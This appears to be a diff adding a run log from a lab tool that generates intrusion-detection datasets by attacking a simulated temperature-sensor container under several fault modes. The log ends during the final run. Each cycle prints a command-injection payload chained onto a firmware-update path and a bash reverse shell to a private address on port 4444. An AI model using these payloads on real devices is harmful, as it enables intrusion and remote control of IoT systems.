@@ -1,0 +1,361 @@
+Testing Docker command access...
+Docker command access confirmed: sudo docker
+Datasets will be saved to: datasets/master_20250421/command_injection
+=====================================================
+Processing command injection under fault condition: none
+=====================================================
+Restarting temperature-sensor-04 container to ensure a clean state...
+temperature-sensor-04
+Waiting for container to fully initialize...
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Collecting baseline data before command injection...
+Starting data collection for event: command_injection_none_baseline
+Duration: 30 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15
+Completed collection with 15 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/none/command_injection_none_baseline_20250421_155805.jsonl
+Baseline data collected: datasets/master_20250421/command_injection/none/command_injection_none_baseline_20250421_155805.jsonl
+Starting data collection for netcat installation phase...
+Data collector running with PID 3806563
+Installing networking tools on sensor localhost:12384...
+Netcat installation response: {
+  "message": "Command '/bin/bash /tmp/firmware/dummy.sh ; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc' returned non-zero exit status 100.", 
+  "status": "error"
+}
+Netcat installation failed: {
+  "message": "Command '/bin/bash /tmp/firmware/dummy.sh ; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc' returned non-zero exit status 100.", 
+  "status": "error"
+}
+Waiting for netcat installation data collection to complete...
+Starting data collection for event: command_injection_none_install
+Duration: 120 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60
+Completed collection with 60 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/none/command_injection_none_install_20250421_155835.jsonl
+Netcat installation data collected: datasets/master_20250421/command_injection/none/command_injection_none_install_20250421_155835.jsonl
+Starting data collection for reverse shell phase...
+Data collector running with PID 3809585
+Establishing reverse shell from sensor localhost:12384 to 172.28.0.7:4444...
+Reverse shell initiation response: {
+  "command": "/bin/bash /tmp/firmware/dummy.sh ; bash -c \"bash -i >& /dev/tcp/172.28.0.7/4444 0>&1\" > /tmp/reverse.log 2>&1 &", 
+  "message": "Firmware updated successfully", 
+  "new_version": "1.2.3", 
+  "path": "/tmp/firmware/dummy.sh", 
+  "status": "success"
+}
+Reverse shell initiated successfully
+Waiting for reverse shell data collection to complete...
+Starting data collection for event: command_injection_none_shell
+Duration: 180 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60Collected snapshot 61Collected snapshot 62Collected snapshot 63Collected snapshot 64Collected snapshot 65Collected snapshot 66Collected snapshot 67Collected snapshot 68Collected snapshot 69Collected snapshot 70Collected snapshot 71Collected snapshot 72Collected snapshot 73Collected snapshot 74Collected snapshot 75Collected snapshot 76Collected snapshot 77Collected snapshot 78Collected snapshot 79Collected snapshot 80Collected snapshot 81Collected snapshot 82Collected snapshot 83Collected snapshot 84Collected snapshot 85Collected snapshot 86Collected snapshot 87Collected snapshot 88Collected snapshot 89Collected snapshot 90
+Completed collection with 90 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/none/command_injection_none_shell_20250421_160036.jsonl
+Reverse shell data collected: datasets/master_20250421/command_injection/none/command_injection_none_shell_20250421_160036.jsonl
+Collecting post-event recovery data...
+Starting data collection for event: command_injection_none_recovery
+Duration: 60 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30
+Completed collection with 30 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/none/command_injection_none_recovery_20250421_160336.jsonl
+Recovery data collected: datasets/master_20250421/command_injection/none/command_injection_none_recovery_20250421_160336.jsonl
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Cooling down for 60 seconds...
+=====================================================
+Processing command injection under fault condition: stuck
+=====================================================
+Restarting temperature-sensor-04 container to ensure a clean state...
+temperature-sensor-04
+Waiting for container to fully initialize...
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Setting fault mode to: stuck on localhost:12384
+Fault mode set response: {
+  "fault_mode": "stuck", 
+  "status": "success"
+}
+Collecting baseline data before command injection...
+Starting data collection for event: command_injection_stuck_baseline
+Duration: 30 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15
+Completed collection with 15 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/stuck/command_injection_stuck_baseline_20250421_160611.jsonl
+Baseline data collected: datasets/master_20250421/command_injection/stuck/command_injection_stuck_baseline_20250421_160611.jsonl
+Starting data collection for netcat installation phase...
+Data collector running with PID 3821101
+Installing networking tools on sensor localhost:12384...
+Starting data collection for event: command_injection_stuck_install
+Duration: 120 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60
+Completed collection with 60 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/stuck/command_injection_stuck_install_20250421_160641.jsonl
+Netcat installation response: {
+  "message": "Command '/bin/bash /tmp/firmware/dummy.sh ; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc' returned non-zero exit status 137.", 
+  "status": "error"
+}
+Netcat installation completed (or was already installed)
+Waiting for netcat installation data collection to complete...
+Netcat installation data collected: datasets/master_20250421/command_injection/stuck/command_injection_stuck_install_20250421_160641.jsonl
+Starting data collection for reverse shell phase...
+Data collector running with PID 3825426
+Establishing reverse shell from sensor localhost:12384 to 172.28.0.7:4444...
+Reverse shell initiation response: {
+  "command": "/bin/bash /tmp/firmware/dummy.sh ; bash -c \"bash -i >& /dev/tcp/172.28.0.7/4444 0>&1\" > /tmp/reverse.log 2>&1 &", 
+  "message": "Firmware updated successfully", 
+  "new_version": "1.2.3", 
+  "path": "/tmp/firmware/dummy.sh", 
+  "status": "success"
+}
+Reverse shell initiated successfully
+Waiting for reverse shell data collection to complete...
+Starting data collection for event: command_injection_stuck_shell
+Duration: 180 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60Collected snapshot 61Collected snapshot 62Collected snapshot 63Collected snapshot 64Collected snapshot 65Collected snapshot 66Collected snapshot 67Collected snapshot 68Collected snapshot 69Collected snapshot 70Collected snapshot 71Collected snapshot 72Collected snapshot 73Collected snapshot 74Collected snapshot 75Collected snapshot 76Collected snapshot 77Collected snapshot 78Collected snapshot 79Collected snapshot 80Collected snapshot 81Collected snapshot 82Collected snapshot 83Collected snapshot 84Collected snapshot 85Collected snapshot 86Collected snapshot 87Collected snapshot 88Collected snapshot 89Collected snapshot 90
+Completed collection with 90 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/stuck/command_injection_stuck_shell_20250421_160847.jsonl
+Reverse shell data collected: datasets/master_20250421/command_injection/stuck/command_injection_stuck_shell_20250421_160847.jsonl
+Collecting post-event recovery data...
+Starting data collection for event: command_injection_stuck_recovery
+Duration: 60 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30
+Completed collection with 30 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/stuck/command_injection_stuck_recovery_20250421_161148.jsonl
+Recovery data collected: datasets/master_20250421/command_injection/stuck/command_injection_stuck_recovery_20250421_161148.jsonl
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Cooling down for 60 seconds...
+=====================================================
+Processing command injection under fault condition: drift
+=====================================================
+Restarting temperature-sensor-04 container to ensure a clean state...
+temperature-sensor-04
+Waiting for container to fully initialize...
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Setting fault mode to: drift on localhost:12384
+Fault mode set response: {
+  "fault_mode": "drift", 
+  "status": "success"
+}
+Collecting baseline data before command injection...
+Starting data collection for event: command_injection_drift_baseline
+Duration: 30 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15
+Completed collection with 15 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/drift/command_injection_drift_baseline_20250421_161420.jsonl
+Baseline data collected: datasets/master_20250421/command_injection/drift/command_injection_drift_baseline_20250421_161420.jsonl
+Starting data collection for netcat installation phase...
+Data collector running with PID 3838194
+Installing networking tools on sensor localhost:12384...
+Starting data collection for event: command_injection_drift_install
+Duration: 120 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60
+Completed collection with 60 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/drift/command_injection_drift_install_20250421_161451.jsonl
+Netcat installation response: {
+  "message": "Command '/bin/bash /tmp/firmware/dummy.sh ; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc' returned non-zero exit status 137.", 
+  "status": "error"
+}
+Netcat installation completed (or was already installed)
+Waiting for netcat installation data collection to complete...
+Netcat installation data collected: datasets/master_20250421/command_injection/drift/command_injection_drift_install_20250421_161451.jsonl
+Starting data collection for reverse shell phase...
+Data collector running with PID 3842306
+Establishing reverse shell from sensor localhost:12384 to 172.28.0.7:4444...
+Reverse shell initiation response: {
+  "command": "/bin/bash /tmp/firmware/dummy.sh ; bash -c \"bash -i >& /dev/tcp/172.28.0.7/4444 0>&1\" > /tmp/reverse.log 2>&1 &", 
+  "message": "Firmware updated successfully", 
+  "new_version": "1.2.3", 
+  "path": "/tmp/firmware/dummy.sh", 
+  "status": "success"
+}
+Reverse shell initiated successfully
+Waiting for reverse shell data collection to complete...
+Starting data collection for event: command_injection_drift_shell
+Duration: 180 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60Collected snapshot 61Collected snapshot 62Collected snapshot 63Collected snapshot 64Collected snapshot 65Collected snapshot 66Collected snapshot 67Collected snapshot 68Collected snapshot 69Collected snapshot 70Collected snapshot 71Collected snapshot 72Collected snapshot 73Collected snapshot 74Collected snapshot 75Collected snapshot 76Collected snapshot 77Collected snapshot 78Collected snapshot 79Collected snapshot 80Collected snapshot 81Collected snapshot 82Collected snapshot 83Collected snapshot 84Collected snapshot 85Collected snapshot 86Collected snapshot 87Collected snapshot 88Collected snapshot 89Collected snapshot 90
+Completed collection with 90 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/drift/command_injection_drift_shell_20250421_161702.jsonl
+Reverse shell data collected: datasets/master_20250421/command_injection/drift/command_injection_drift_shell_20250421_161702.jsonl
+Collecting post-event recovery data...
+Starting data collection for event: command_injection_drift_recovery
+Duration: 60 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30
+Completed collection with 30 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/drift/command_injection_drift_recovery_20250421_162002.jsonl
+Recovery data collected: datasets/master_20250421/command_injection/drift/command_injection_drift_recovery_20250421_162002.jsonl
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Cooling down for 60 seconds...
+=====================================================
+Processing command injection under fault condition: spike
+=====================================================
+Restarting temperature-sensor-04 container to ensure a clean state...
+temperature-sensor-04
+Waiting for container to fully initialize...
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Setting fault mode to: spike on localhost:12384
+Fault mode set response: {
+  "fault_mode": "spike", 
+  "status": "success"
+}
+Collecting baseline data before command injection...
+Starting data collection for event: command_injection_spike_baseline
+Duration: 30 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15
+Completed collection with 15 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/spike/command_injection_spike_baseline_20250421_162235.jsonl
+Baseline data collected: datasets/master_20250421/command_injection/spike/command_injection_spike_baseline_20250421_162235.jsonl
+Starting data collection for netcat installation phase...
+Data collector running with PID 3853500
+Installing networking tools on sensor localhost:12384...
+Starting data collection for event: command_injection_spike_install
+Duration: 120 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60
+Completed collection with 60 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/spike/command_injection_spike_install_20250421_162306.jsonl
+Netcat installation response: {
+  "message": "Command '/bin/bash /tmp/firmware/dummy.sh ; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc' returned non-zero exit status 100.", 
+  "status": "error"
+}
+Netcat installation failed: {
+  "message": "Command '/bin/bash /tmp/firmware/dummy.sh ; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc' returned non-zero exit status 100.", 
+  "status": "error"
+}
+Waiting for netcat installation data collection to complete...
+Netcat installation data collected: datasets/master_20250421/command_injection/spike/command_injection_spike_install_20250421_162306.jsonl
+Starting data collection for reverse shell phase...
+Data collector running with PID 3859099
+Establishing reverse shell from sensor localhost:12384 to 172.28.0.7:4444...
+Reverse shell initiation response: {
+  "command": "/bin/bash /tmp/firmware/dummy.sh ; bash -c \"bash -i >& /dev/tcp/172.28.0.7/4444 0>&1\" > /tmp/reverse.log 2>&1 &", 
+  "message": "Firmware updated successfully", 
+  "new_version": "1.2.3", 
+  "path": "/tmp/firmware/dummy.sh", 
+  "status": "success"
+}
+Reverse shell initiated successfully
+Waiting for reverse shell data collection to complete...
+Starting data collection for event: command_injection_spike_shell
+Duration: 180 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60Collected snapshot 61Collected snapshot 62Collected snapshot 63Collected snapshot 64Collected snapshot 65Collected snapshot 66Collected snapshot 67Collected snapshot 68Collected snapshot 69Collected snapshot 70Collected snapshot 71Collected snapshot 72Collected snapshot 73Collected snapshot 74Collected snapshot 75Collected snapshot 76Collected snapshot 77Collected snapshot 78Collected snapshot 79Collected snapshot 80Collected snapshot 81Collected snapshot 82Collected snapshot 83Collected snapshot 84Collected snapshot 85Collected snapshot 86Collected snapshot 87Collected snapshot 88Collected snapshot 89Collected snapshot 90
+Completed collection with 90 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/spike/command_injection_spike_shell_20250421_162541.jsonl
+Reverse shell data collected: datasets/master_20250421/command_injection/spike/command_injection_spike_shell_20250421_162541.jsonl
+Collecting post-event recovery data...
+Starting data collection for event: command_injection_spike_recovery
+Duration: 60 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30
+Completed collection with 30 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/spike/command_injection_spike_recovery_20250421_162841.jsonl
+Recovery data collected: datasets/master_20250421/command_injection/spike/command_injection_spike_recovery_20250421_162841.jsonl
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Cooling down for 60 seconds...
+=====================================================
+Processing command injection under fault condition: dropout
+=====================================================
+Restarting temperature-sensor-04 container to ensure a clean state...
+temperature-sensor-04
+Waiting for container to fully initialize...
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Setting fault mode to: dropout on localhost:12384
+Fault mode set response: {
+  "fault_mode": "dropout", 
+  "status": "success"
+}
+Collecting baseline data before command injection...
+Starting data collection for event: command_injection_dropout_baseline
+Duration: 30 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15
+Completed collection with 15 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/dropout/command_injection_dropout_baseline_20250421_163117.jsonl
+Baseline data collected: datasets/master_20250421/command_injection/dropout/command_injection_dropout_baseline_20250421_163117.jsonl
+Starting data collection for netcat installation phase...
+Data collector running with PID 3872203
+Installing networking tools on sensor localhost:12384...
+Netcat installation response: {
+  "message": "Command '/bin/bash /tmp/firmware/dummy.sh ; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc' returned non-zero exit status 137.", 
+  "status": "error"
+}
+Netcat installation completed (or was already installed)
+Waiting for netcat installation data collection to complete...
+Starting data collection for event: command_injection_dropout_install
+Duration: 120 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60
+Completed collection with 60 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/dropout/command_injection_dropout_install_20250421_163147.jsonl
+Netcat installation data collected: datasets/master_20250421/command_injection/dropout/command_injection_dropout_install_20250421_163147.jsonl
+Starting data collection for reverse shell phase...
+Data collector running with PID 3875328
+Establishing reverse shell from sensor localhost:12384 to 172.28.0.7:4444...
+Reverse shell initiation response: {
+  "command": "/bin/bash /tmp/firmware/dummy.sh ; bash -c \"bash -i >& /dev/tcp/172.28.0.7/4444 0>&1\" > /tmp/reverse.log 2>&1 &", 
+  "message": "Firmware updated successfully", 
+  "new_version": "1.2.3", 
+  "path": "/tmp/firmware/dummy.sh", 
+  "status": "success"
+}
+Reverse shell initiated successfully
+Waiting for reverse shell data collection to complete...
+Starting data collection for event: command_injection_dropout_shell
+Duration: 180 seconds, Interval: 2 seconds
